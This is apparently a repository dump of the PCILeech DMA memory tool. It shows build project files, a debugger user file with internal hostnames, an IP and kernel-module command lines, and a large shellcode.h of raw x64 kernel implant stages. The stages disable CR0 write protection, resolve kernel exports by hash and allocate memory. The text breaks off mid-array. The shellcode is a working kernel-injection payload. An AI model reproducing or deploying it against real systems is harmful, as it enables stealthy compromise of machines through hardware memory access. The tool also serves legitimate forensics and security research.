    <ClInclude Include="..\includes\leechcore.h">
      <Filter>Header Files\includes</Filter>
    </ClInclude>
    <ClInclude Include="..\includes\public.h">
      <Filter>Header Files\includes</Filter>
    </ClInclude>
    <ClInclude Include="..\includes\vmmdll.h">
      <Filter>Header Files\includes</Filter>
    </ClInclude>
    <ClInclude Include="vmmx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ob\ob.h">
      <Filter>Header Files\ob</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="device.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="executor.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="extra.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="help.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kmd.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memdump.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="mempatch.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="oscompatibility.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="pcileech.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="statistics.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="umd.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="util.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="vfs.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="vmmx.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ob\ob_cachemap.c">
      <Filter>Source Files\ob</Filter>
    </ClCompile>
    <ClCompile Include="ob\ob_core.c">
      <Filter>Source Files\ob</Filter>
    </ClCompile>
    <ClCompile Include="ob\ob_map.c">
      <Filter>Source Files\ob</Filter>
    </ClCompile>
    <ClCompile Include="ob\ob_set.c">
      <Filter>Source Files\ob</Filter>
    </ClCompile>
    <ClCompile Include="charutil.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="vfslist.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`pcileech/pcileech.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <RemoteDebuggerCommand>\\ad.frizk.net\data\dev-pcileech\bin\pcileech.exe</RemoteDebuggerCommand>
    <RemoteDebuggerWorkingDirectory>\\ad.frizk.net\data\dev-pcileech\bin\</RemoteDebuggerWorkingDirectory>
    <RemoteDebuggerServerName>WORKSTATION.ad.frizk.net</RemoteDebuggerServerName>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArguments>-device pmem -remote rpc://frizk@ad.frizk.net:localhost display -min 0x1000</LocalDebuggerCommandArguments>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <RemoteDebuggerCommand>\\ad.frizk.net\data\dev-pcileech\bin\pcileech.exe</RemoteDebuggerCommand>
    <RemoteDebuggerWorkingDirectory>\\ad.frizk.net\data\dev-pcileech\bin\</RemoteDebuggerWorkingDirectory>
    <RemoteDebuggerServerName>WORKSTATION.ad.frizk.net</RemoteDebuggerServerName>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArguments>-device pmem -remote rpc://frizk@ad.frizk.net:localhost display -min 0x1000</LocalDebuggerCommandArguments>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>WindowsRemoteDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArguments>wx64_pscmd -kmd 0x7ffff000  -device rawudp://10.9.0.175 -v -vv</LocalDebuggerCommandArguments>
    <RemoteDebuggerCommand>\\ad.frizk.net\data\dev-pcileech\bin\pcileech.exe</RemoteDebuggerCommand>
    <RemoteDebuggerCommandArguments>pcileech -device fpga -v  -vv -vvv -min 0x1000 display</RemoteDebuggerCommandArguments>
    <RemoteDebuggerWorkingDirectory>\\ad.frizk.net\data\dev-pcileech\bin\</RemoteDebuggerWorkingDirectory>
    <RemoteDebuggerServerName>WORKSTATION.ad.frizk.net</RemoteDebuggerServerName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>WindowsRemoteDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArguments>wx64_pscmd -kmd 0x7ffff000  -device rawudp://10.9.0.175 -v -vv</LocalDebuggerCommandArguments>
    <RemoteDebuggerCommand>\\ad.frizk.net\data\dev-pcileech\bin\pcileech.exe</RemoteDebuggerCommand>
    <RemoteDebuggerCommandArguments>pcileech -device fpga -v  -vv -vvv -min 0x1000 display</RemoteDebuggerCommandArguments>
    <RemoteDebuggerWorkingDirectory>\\ad.frizk.net\data\dev-pcileech\bin\</RemoteDebuggerWorkingDirectory>
    <RemoteDebuggerServerName>WORKSTATION.ad.frizk.net</RemoteDebuggerServerName>
  </PropertyGroup>
</Project>
```

`pcileech/shellcode.h`:

```h
// shellcode.h : default shellcode used by pcileech in default scenarios.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __SHELLCODE_H__
#define __SHELLCODE_H__

typedef struct tdSHELLCODE_DEFAULT_STRUCT {
    const LPSTR sz;
    const DWORD cb;
    const PBYTE pb;
} SHELLCODE_DEFAULT_STRUCT, *PSHELLCODE_DEFAULT_STRUCT;

const BYTE WINX64_STAGE1_BIN[] = {
    0xe8, 0xfb, 0xff, 0xff, 0xff
};

const BYTE WINX64_STAGE2_BIN[] = {
    0xeb, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83, 0xe8,
    0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x0f, 0x20, 0xc1, 0x51,
    0x81, 0xe1, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc1, 0x48, 0x8b, 0x15,
    0xd4, 0xff, 0xff, 0xff, 0x48, 0x89, 0x10, 0xb0, 0x00, 0xb2, 0x01, 0x48,
    0x8d, 0x0d, 0xc0, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0, 0x11, 0x75, 0x22,
    0x41, 0x54, 0x41, 0x55, 0x48, 0x83, 0xec, 0x20, 0x0f, 0x01, 0x0c, 0x24,
    0x48, 0x8b, 0x4c, 0x24, 0x02, 0x48, 0x8b, 0x49, 0x04, 0xe8, 0xb4, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5d, 0x41, 0x5c, 0x58, 0x0f,
    0x22, 0xc0, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0xc3, 0x56, 0x57, 0x48,
    0x8b, 0xf1, 0x48, 0x33, 0xff, 0x48, 0x33, 0xc0, 0xfc, 0xac, 0x84, 0xc0,
    0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x03, 0xf8, 0xeb, 0xf4, 0x8b, 0xc7, 0x5f,
    0x5e, 0xc3, 0x48, 0xc1, 0xe9, 0x0c, 0x48, 0xc1, 0xe1, 0x0c, 0xb8, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x2b, 0xc8, 0x66, 0x8b, 0x01, 0x66, 0x3d, 0x4d,
    0x5a, 0x75, 0xef, 0x8b, 0x41, 0x3c, 0x3d, 0x00, 0x10, 0x00, 0x00, 0x77,
    0xe5, 0x48, 0x03, 0xc1, 0x8b, 0x00, 0x3d, 0x50, 0x45, 0x00, 0x00, 0x75,
    0xd9, 0x48, 0x8b, 0xc1, 0xc3, 0x57, 0x56, 0x8b, 0x79, 0x3c, 0x8b, 0xbc,
    0x39, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xf9, 0x44, 0x8b, 0x47, 0x18,
    0x48, 0x33, 0xf6, 0x8b, 0x47, 0x20, 0x48, 0x03, 0xc1, 0x8b, 0x04, 0xb0,
    0x48, 0x03, 0xc1, 0x51, 0x48, 0x8b, 0xc8, 0xe8, 0x85, 0xff, 0xff, 0xff,
    0x59, 0x3b, 0xc2, 0x74, 0x05, 0x48, 0xff, 0xc6, 0xeb, 0xe1, 0x8b, 0x57,
    0x24, 0x48, 0x03, 0xd1, 0x48, 0x33, 0xc0, 0x66, 0x8b, 0x04, 0x72, 0x8b,
    0x57, 0x1c, 0x48, 0x03, 0xd1, 0x8b, 0x04, 0x82, 0x48, 0x03, 0xc1, 0x5e,
    0x5f, 0xc3, 0xe8, 0x77, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xe0, 0x49, 0x8b,
    0xcc, 0xba, 0xbc, 0x1e, 0x36, 0x9f, 0xe8, 0x9a, 0xff, 0xff, 0xff, 0x48,
    0xc7, 0xc1, 0x00, 0x20, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xff, 0xff, 0xff,
    0x7f, 0xff, 0xd0, 0x4c, 0x8b, 0xe8, 0x48, 0x33, 0xc0, 0xb9, 0x00, 0x04,
    0x00, 0x00, 0xff, 0xc9, 0x49, 0x89, 0x44, 0xcd, 0x00, 0x75, 0xf7, 0x4d,
    0x89, 0x65, 0x08, 0x48, 0xb8, 0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff, 0xff,
    0x48, 0x49, 0x89, 0x85, 0x00, 0x10, 0x00, 0x00, 0x48, 0xb8, 0x8b, 0x00,
    0x48, 0x83, 0xf8, 0x00, 0x74, 0xf0, 0x49, 0x89, 0x85, 0x08, 0x10, 0x00,
    0x00, 0x41, 0x55, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x03, 0xc5, 0x50,
    0x6a, 0x00, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xcc, 0xba, 0x02, 0x6b,
    0xa0, 0x94, 0xe8, 0x32, 0xff, 0xff, 0xff, 0x49, 0x8b, 0xcd, 0x48, 0xc7,
    0xc2, 0xff, 0xff, 0x1f, 0x00, 0x4d, 0x33, 0xc0, 0x4d, 0x33, 0xc9, 0xff,
    0xd0, 0x48, 0x83, 0xc4, 0x38, 0x49, 0x8b, 0xcc, 0xba, 0x57, 0x63, 0x32,
    0x5a, 0xe8, 0x0f, 0xff, 0xff, 0xff, 0x49, 0x8b, 0xcd, 0xff, 0xd0, 0x89,
    0x05, 0x43, 0xfe, 0xff, 0xff, 0xc3
};

const BYTE WINX64_STAGE3_BIN[] = {
    0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83,
    0xf8, 0x00, 0x74, 0xf0, 0x48, 0x8d, 0x0d, 0xe9, 0xef, 0xff, 0xff, 0x56,
    0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8,
    0xa4, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc,
    0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x8b,
    0xea, 0x33, 0xd2, 0x44, 0x8b, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00, 0x4c,
    0x03, 0xc1, 0x45, 0x8b, 0x50, 0x20, 0x41, 0x8b, 0x78, 0x24, 0x4c, 0x03,
    0xd1, 0x41, 0x8b, 0x58, 0x1c, 0x48, 0x03, 0xf9, 0x41, 0x8b, 0x70, 0x18,
    0x48, 0x03, 0xd9, 0x85, 0xf6, 0x74, 0x2e, 0x45, 0x8b, 0x0a, 0x4c, 0x03,
    0xc9, 0x45, 0x33, 0xdb, 0xeb, 0x0d, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc1,
    0x41, 0xc1, 0xcb, 0x0d, 0x44, 0x03, 0xd8, 0x41, 0x8a, 0x01, 0x84, 0xc0,
    0x75, 0xec, 0x44, 0x3b, 0xdd, 0x74, 0x21, 0xff, 0xc2, 0x49, 0x83, 0xc2,
    0x04, 0x3b, 0xd6, 0x72, 0xd2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08,
    0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x48, 0x8b,
    0x7c, 0x24, 0x20, 0xc3, 0x0f, 0xb7, 0x14, 0x57, 0x41, 0x3b, 0x50, 0x14,
    0x73, 0xdf, 0x8b, 0x04, 0x93, 0x48, 0x03, 0xc1, 0xeb, 0xd9, 0xcc, 0xcc,
    0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48,
    0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 0x48, 0x8d, 0x68, 0xa1,
    0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x77, 0x33, 0x33,
    0x11, 0x77, 0x33, 0x11, 0xff, 0x48, 0xc7, 0x41, 0x50, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x01, 0x48, 0x8d, 0x75, 0x03, 0x48, 0x8b, 0xd9, 0xc7,
    0x45, 0xd7, 0x1f, 0x9d, 0x48, 0x9d, 0xc7, 0x45, 0xdb, 0x92, 0xf5, 0x45,
    0x13, 0x4c, 0x8d, 0xb1, 0x58, 0x03, 0x00, 0x00, 0xc7, 0x45, 0xdf, 0xbc,
    0x1e, 0x36, 0x9f, 0xbf, 0x0b, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xe3, 0x57,
    0x63, 0x32, 0x5a, 0xc7, 0x45, 0xe7, 0x6f, 0xa5, 0x77, 0x49, 0xc7, 0x45,
    0xeb, 0xf9, 0xbe, 0xdd, 0x05, 0xc7, 0x45, 0xef, 0xc9, 0xc5, 0x6e, 0x6c,
    0xc7, 0x45, 0xf3, 0x02, 0x6b, 0xa0, 0x94, 0xc7, 0x45, 0xf7, 0x9b, 0x97,
    0x64, 0xcf, 0xc7, 0x45, 0xfb, 0x89, 0x4d, 0x3f, 0xbc, 0xc7, 0x45, 0xff,
    0x92, 0x6d, 0x58, 0x58, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x8d, 0x76, 0xfc,
    0x8b, 0x16, 0x4d, 0x8d, 0x76, 0xf8, 0xe8, 0xbd, 0xfe, 0xff, 0xff, 0x49,
    0x89, 0x06, 0x83, 0xc7, 0xff, 0x75, 0xe5, 0x48, 0x8b, 0xcb, 0x4c, 0x8d,
    0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b,
    0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b,
    0xe3, 0x5d, 0xe9, 0x01, 0x00, 0x00, 0x00, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
    0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,
    0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0xc7, 0x40, 0x08,
    0xf0, 0xd8, 0xff, 0xff, 0xb9, 0x00, 0x00, 0x00, 0x01, 0x41, 0xbe, 0xff,
    0xff, 0xff, 0xff, 0x41, 0x8b, 0xd6, 0x33, 0xf6, 0x48, 0x89, 0x4b, 0x18,
    0xff, 0x93, 0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0,
    0x75, 0x2c, 0xb9, 0x00, 0x00, 0x40, 0x00, 0x41, 0x8b, 0xd6, 0x48, 0x89,
    0x4b, 0x18, 0xff, 0x93, 0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48,
    0x85, 0xc0, 0x75, 0x12, 0x48, 0x21, 0x73, 0x18, 0xb8, 0x01, 0x00, 0x00,
    0xf0, 0x48, 0x89, 0x43, 0x30, 0xe9, 0xab, 0x01, 0x00, 0x00, 0x48, 0x8b,
    0xcf, 0x48, 0x89, 0x7b, 0x28, 0xff, 0x93, 0x18, 0x03, 0x00, 0x00, 0x48,
    0x89, 0x43, 0x20, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x83,
    0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x30, 0x48, 0x85, 0xc0, 0x75,
    0x23, 0x49, 0x03, 0xf6, 0x48, 0xb8, 0x00, 0xe4, 0x0b, 0x54, 0x02, 0x00,
    0x00, 0x00, 0x48, 0x3b, 0xf0, 0x76, 0xde, 0x4c, 0x8d, 0x44, 0x24, 0x30,
    0x33, 0xd2, 0x33, 0xc9, 0xff, 0x93, 0x50, 0x03, 0x00, 0x00, 0xeb, 0xcd,
    0x48, 0xc7, 0x43, 0x30, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x03,
    0x0f, 0x84, 0x23, 0x01, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x4e,
    0xff, 0x93, 0x20, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0,
    0x75, 0x06, 0x48, 0x21, 0x43, 0x38, 0xeb, 0x3a, 0x45, 0x33, 0xc0, 0x48,
    0x83, 0x38, 0x00, 0x75, 0x07, 0x48, 0x83, 0x78, 0x08, 0x00, 0x74, 0x09,
    0x4d, 0x03, 0xc6, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0xea, 0x49, 0xc1, 0xe0,
    0x04, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x4c, 0x89, 0x43, 0x48, 0xff,
    0x93, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x00, 0x03,
    0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00,
    0x00, 0x05, 0x75, 0x17, 0x4c, 0x8d, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48,
    0x8b, 0xcb, 0x48, 0x8d, 0x93, 0x20, 0x01, 0x00, 0x00, 0xff, 0xd7, 0x4c,
    0x89, 0x73, 0x38, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x49, 0x2b,
    0xc6, 0x49, 0x3b, 0xc6, 0x77, 0x52, 0x48, 0x8b, 0x53, 0x48, 0x45, 0x33,
    0xc0, 0x48, 0x8b, 0x4b, 0x40, 0xff, 0x93, 0x28, 0x03, 0x00, 0x00, 0x48,
    0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x34, 0x4c, 0x8b, 0x43, 0x48, 0x4c,
    0x39, 0xb3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x08, 0x48, 0x8b, 0xd0, 0x48,
    0x8b, 0xcf, 0xeb, 0x06, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xff, 0x93,
    0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x53, 0x48, 0x48, 0x8b, 0xce, 0xff,
    0x93, 0x30, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0xeb, 0x05, 0x48,
    0x83, 0x63, 0x38, 0x00, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x06,
    0x75, 0x15, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0x53,
    0x40, 0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48,
    0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x07, 0x75, 0x15, 0x4c, 0x8b, 0x43,
    0x48, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0x4b, 0x40, 0xff, 0x93, 0x40, 0x03,
    0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00,
    0x00, 0x00, 0x33, 0xf6, 0xe9, 0x98, 0xfe, 0xff, 0xff, 0xb8, 0x00, 0x00,
    0x00, 0xf0, 0x48, 0x8b, 0xcf, 0x48, 0x89, 0x43, 0x30, 0xff, 0x93, 0x08,
    0x03, 0x00, 0x00, 0x48, 0x83, 0x63, 0x20, 0x00, 0x48, 0x83, 0x63, 0x28,
    0x00, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00,
    0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b,
    0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20,
    0x41, 0x5e, 0xc3
};

const BYTE WINX64_STAGE2_HAL_BIN[] = {
    0xeb, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x51, 0x52, 0x41, 0x50,
    0x41, 0x51, 0x53, 0x56, 0x57, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41,
    0x55, 0x48, 0x83, 0xec, 0x20, 0x0f, 0x01, 0x0c, 0x24, 0x48, 0x8b, 0x4c,
    0x24, 0x02, 0x48, 0x8b, 0x49, 0x04, 0xe8, 0x36, 0x01, 0x00, 0x00, 0x4c,
    0x8b, 0xe0, 0x49, 0x8b, 0xcc, 0xba, 0xce, 0xad, 0x90, 0x4d, 0xe8, 0x59,
    0x01, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x85, 0xc0, 0x75, 0x5c, 0xb0, 0x00,
    0xb2, 0x01, 0xf0, 0x0f, 0xb0, 0x15, 0x98, 0xff, 0xff, 0xff, 0x75, 0x4e,
    0x48, 0x8b, 0x05, 0x9d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x0d, 0x8e, 0xff,
    0xff, 0xff, 0x48, 0x89, 0x08, 0x49, 0x8b, 0xcc, 0xba, 0x02, 0x6b, 0xa0,
    0x94, 0xe8, 0x26, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x6a, 0x00, 0x41,
    0x54, 0x48, 0x8d, 0x05, 0x40, 0x00, 0x00, 0x00, 0x50, 0x6a, 0x00, 0x48,
    0x83, 0xec, 0x20, 0x4d, 0x33, 0xc9, 0x4d, 0x33, 0xc0, 0x48, 0xc7, 0xc2,
    0xff, 0xff, 0x1f, 0x00, 0x48, 0x8d, 0x0d, 0x65, 0xff, 0xff, 0xff, 0x41,
    0xff, 0xd5, 0x48, 0x83, 0xc4, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5d,
    0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x5f, 0x5e, 0x5b, 0x41, 0x59, 0x41,
    0x58, 0x5a, 0x59, 0x48, 0x8b, 0x05, 0x32, 0xff, 0xff, 0xff, 0xff, 0xe0,
    0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xe1, 0xba,
    0xbc, 0x1e, 0x36, 0x9f, 0xe8, 0xc3, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc1,
    0x00, 0x20, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xff, 0xff, 0xff, 0x7f, 0xff,
    0xd0, 0x4c, 0x8b, 0xe8, 0x48, 0x33, 0xc0, 0xb9, 0x00, 0x04, 0x00, 0x00,
    0xff, 0xc9, 0x49, 0x89, 0x44, 0xcd, 0x00, 0x75, 0xf7, 0x49, 0x8b, 0xc4,
    0x49, 0x89, 0x45, 0x08, 0x48, 0xb8, 0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff,
    0xff, 0x48, 0x49, 0x89, 0x85, 0x00, 0x10, 0x00, 0x00, 0x48, 0xb8, 0x8b,
    0x00, 0x48, 0x83, 0xf8, 0x00, 0x74, 0xf0, 0x49, 0x89, 0x85, 0x08, 0x10,
    0x00, 0x00, 0x49, 0x8b, 0xcc, 0xba, 0x57, 0x63, 0x32, 0x5a, 0xe8, 0x69,
    0x00, 0x00, 0x00, 0x49, 0x8b, 0xcd, 0xff, 0xd0, 0x89, 0x05, 0xb2, 0xfe,
    0xff, 0xff, 0x48, 0x8b, 0xe5, 0x5d, 0x49, 0x81, 0xc5, 0x00, 0x10, 0x00,
    0x00, 0x41, 0xff, 0xe5, 0x56, 0x57, 0x48, 0x8b, 0xf1, 0x48, 0x33, 0xff,
    0x48, 0x33, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d,
    0x03, 0xf8, 0xeb, 0xf4, 0x8b, 0xc7, 0x5f, 0x5e, 0xc3, 0x48, 0xc1, 0xe9,
    0x0c, 0x48, 0xc1, 0xe1, 0x0c, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x2b,
    0xc8, 0x66, 0x8b, 0x01, 0x66, 0x3d, 0x4d, 0x5a, 0x75, 0xef, 0x8b, 0x41,
    0x3c, 0x3d, 0x00, 0x10, 0x00, 0x00, 0x77, 0xe5, 0x48, 0x03, 0xc1, 0x8b,
    0x00, 0x3d, 0x50, 0x45, 0x00, 0x00, 0x75, 0xd9, 0x48, 0x8b, 0xc1, 0xc3,
    0x57, 0x56, 0x8b, 0x79, 0x3c, 0x8b, 0xbc, 0x39, 0x88, 0x00, 0x00, 0x00,
    0x48, 0x03, 0xf9, 0x44, 0x8b, 0x47, 0x18, 0x48, 0x33, 0xf6, 0x8b, 0x47,
    0x20, 0x48, 0x03, 0xc1, 0x8b, 0x04, 0xb0, 0x48, 0x03, 0xc1, 0x51, 0x48,
    0x8b, 0xc8, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x59, 0x3b, 0xc2, 0x74, 0x05,
    0x48, 0xff, 0xc6, 0xeb, 0xe1, 0x8b, 0x57, 0x24, 0x48, 0x03, 0xd1, 0x48,
    0x33, 0xc0, 0x66, 0x8b, 0x04, 0x72, 0x8b, 0x57, 0x1c, 0x48, 0x03, 0xd1,
    0x8b, 0x04, 0x82, 0x48, 0x03, 0xc1, 0x5e, 0x5f, 0xc3
};

const BYTE WINX64_STAGE23_VMM[] = {
  0xeb, 0x56, 0xe9, 0xd5, 0x01, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
  0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
  0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,
  0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
  0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41,
  0x54, 0x41, 0x55, 0xff, 0x15, 0xdf, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x16, 0xb0, 0x00,
  0xb2, 0x01, 0x48, 0x8b, 0x0d, 0x8f, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0, 0x11, 0x75, 0x05, 0xe8,
  0x11, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0x58, 0xff,
  0x25, 0x7b, 0xff, 0xff, 0xff, 0x50, 0x4c, 0x8b, 0x25, 0x7b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xec,
  0x20, 0x48, 0xc7, 0xc1, 0x00, 0x10, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xff, 0xff, 0xff, 0x7f, 0xff,
  0x15, 0x7b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x4c, 0x8b, 0xe8, 0x41, 0xc6, 0x04, 0x24,
  0x02, 0x49, 0x89, 0x44, 0x24, 0x10, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xcd, 0xff, 0x15, 0x6d,
  0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x48, 0x8b, 0x0d, 0x42, 0xff, 0xff, 0xff, 0x48, 0x89,
  0x01, 0x41, 0xc6, 0x04, 0x24, 0x03, 0x48, 0x33, 0xc0, 0xb9, 0x00, 0x02, 0x00, 0x00, 0xff, 0xc9,
  0x49, 0x89, 0x44, 0xcd, 0x00, 0x75, 0xf7, 0x41, 0xc6, 0x04, 0x24, 0x04, 0x48, 0x8b, 0x05, 0x25,
